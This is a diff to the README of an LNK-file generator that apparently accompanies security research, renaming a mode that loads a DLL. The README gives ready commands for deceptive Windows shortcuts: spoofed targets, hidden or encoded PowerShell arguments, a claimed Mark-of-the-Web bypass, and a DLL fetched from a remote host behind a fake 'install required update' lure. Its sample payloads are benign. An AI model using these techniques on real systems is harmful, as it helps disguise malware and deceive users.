@@ -20,25 +20,25 @@ Read more about this tool in the blog post [_Trust Me, I'm A Shortcut_](https://
 | `CVE20259491`<br>🟢 Arguments invisible<br>🔴 Shows real target EXE<br>🔴 Detected by Windows Defender | <img src="/docs/CVE20259491.jpg" alt="Screenshot" width="250" /> | `python3 -m lnk-generator.generate --target-executable "%COMSPEC%" --target-command-line "/c calc.exe" CVE20259491` |
 | `SPOOFEXE_OVERFLOWARGS_DISABLETARGET`<br>🟢 Spoofed target EXE<br>🟢 Arguments invisible<br>🔴 Requires Win 11 23H2 or earlier, requires double double-clicking to open<br>🔵 Target field disabled<br>🔵 Updates to true path after opening| <img src="/docs/SPOOFEXE_OVERFLOWARGS_DISABLETARGET.jpg" alt="Screenshot" width="250" /> | `python3 -m lnk-generator.generate --fake-path "C:\README.txt" --target-executable "c:\windows\system32\cmd.exe" --target-command-line "/c ping 127.0.0.1" --icon "%WINDIR%\System32\imageres.dll" --icon-index=97 SPOOFEXE_OVERFLOWARGS_DISABLETARGET` |
 | `SPOOFEXE_HIDEARGS_DISABLETARGET`<br>🟢 Spoofed target EXE<br>🟢 Arguments invisible<br>🔵 Target field disabled<br>🔵 Updates to true path after opening | <img src="/docs/SPOOFEXE_HIDEARGS_DISABLETARGET.jpg" alt="Screenshot" width="250" /> | `python3 -m lnk-generator.generate --fake-path "F:\USB Drive" --target-executable "%WINDIR%\System32\WindowsPowershell\v1.0\powershell.exe" --target-command-line "/ec ZQBjAGgAbwAgACIASABpACAAZgByAG8AbQAgAEAAVwBpAGUAdAB6AGUAIgA7ACAAcgBlAGEAZAAtAGgAbwBzAHQA" --icon "%WINDIR%\System32\shell32.dll" --icon-index=7 SPOOFEXE_HIDEARGS_DISABLETARGET` |
-| `SPOOFEXE_RUNDLL`<br>🟢 Spoofed target EXE<br>🟢 Bypasses MotW on systems without [CVE-2026-21513](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2026-21513)<br>🔵 Executes DLLs only (either remote or local)<br>🔵 Target field disabled<br>🔴 Executes DLL via [RunDLL32 with shell32.dll](https://lolbas-project.github.io/lolbas/Libraries/Shell32/), which is easily detectable  | <img src="/docs/SPOOFEXE_RUNDL.jpg" alt="Screenshot" width="250" /> | `python3 -m lnk-generator.generate --target-executable "\\\\123.45.67.89\calc.dll" --fake-path "Please open to install required update" --icon "%windir%\system32\imageres.dll" --icon-index 102 SPOOFEXE_RUNDLL` |
+| `SPOOFEXE_RUNDLL_DISABLETARGET`<br>🟢 Spoofed target EXE<br>🟢 Bypasses MotW on systems without [CVE-2026-21513](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2026-21513)<br>🔵 Executes DLLs only (either remote or local)<br>🔵 Target field disabled<br>🔴 Executes DLL via [RunDLL32 with shell32.dll](https://lolbas-project.github.io/lolbas/Libraries/Shell32/), which is easily detectable  | <img src="/docs/SPOOFEXE_RUNDL.jpg" alt="Screenshot" width="250" /> | `python3 -m lnk-generator.generate --target-executable "\\\\123.45.67.89\calc.dll" --fake-path "Please open to install required update" --icon "%windir%\system32\imageres.dll" --icon-index 102 SPOOFEXE_RUNDLL_DISABLETARGET` |
 
 ## Usage
 
 ```text
 usage: generate.py [-h] --target-executable c:\path\to\file.exe [--target-command-line "/some /arguments"] [--fake-path c:\path\to\fake_file.exe]
                    [--icon c:\path\to\icon.ico] [--icon-index n] [--output path/to/shortcut.lnk]
-                   {SPOOFEXE_SHOWARGS_ENABLETARGET,REALEXE_HIDEARGS_DISABLETARGET,SPOOFEXE_OVERFLOWARGS_DISABLETARGET,SPOOFEXE_HIDEARGS_DISABLETARGET,CVE20259491,SPOOFEXE_RUNDLL}
+                   {SPOOFEXE_SHOWARGS_ENABLETARGET,REALEXE_HIDEARGS_DISABLETARGET,SPOOFEXE_OVERFLOWARGS_DISABLETARGET,SPOOFEXE_HIDEARGS_DISABLETARGET,CVE20259491,SPOOFEXE_RUNDLL_DISABLETARGET}
 
 Generate a deceptive LNK file. (C) @Wietze, 2025-2026
 
 positional arguments:
-  {SPOOFEXE_SHOWARGS_ENABLETARGET,REALEXE_HIDEARGS_DISABLETARGET,SPOOFEXE_OVERFLOWARGS_DISABLETARGET,SPOOFEXE_HIDEARGS_DISABLETARGET,CVE20259491,SPOOFEXE_RUNDLL}
+  {SPOOFEXE_SHOWARGS_ENABLETARGET,REALEXE_HIDEARGS_DISABLETARGET,SPOOFEXE_OVERFLOWARGS_DISABLETARGET,SPOOFEXE_HIDEARGS_DISABLETARGET,CVE20259491,SPOOFEXE_RUNDLL_DISABLETARGET}
                         SPOOFEXE_SHOWARGS_ENABLETARGET          Spoof the target executable (command-line arguments will remain visible, target field will be enabled)
                         REALEXE_HIDEARGS_DISABLETARGET          Disable the entire target field, only show target executable (command-line arguments are invisible)
                         SPOOFEXE_OVERFLOWARGS_DISABLETARGET     Spoof the target executable (command-line arguments will be visually hidden, target field will be disabled) - no longer works on Windows 11 24H2 and higher
                         SPOOFEXE_HIDEARGS_DISABLETARGET         Spoof the target executable (command-line arguments will be fully hidden, target field will be disabled)
                         CVE20259491                             Only show target executable (command-line arguments are invisible)
-                        SPOOFEXE_RUNDLL                         Load an arbitrary DLL whilst disabling the entire target field, optionally displaying a fake path.
+                        SPOOFEXE_RUNDLL_DISABLETARGET           Load an arbitrary DLL whilst disabling the entire target field, optionally displaying a fake path.
 
 options:
   -h, --help            show this help message and exit
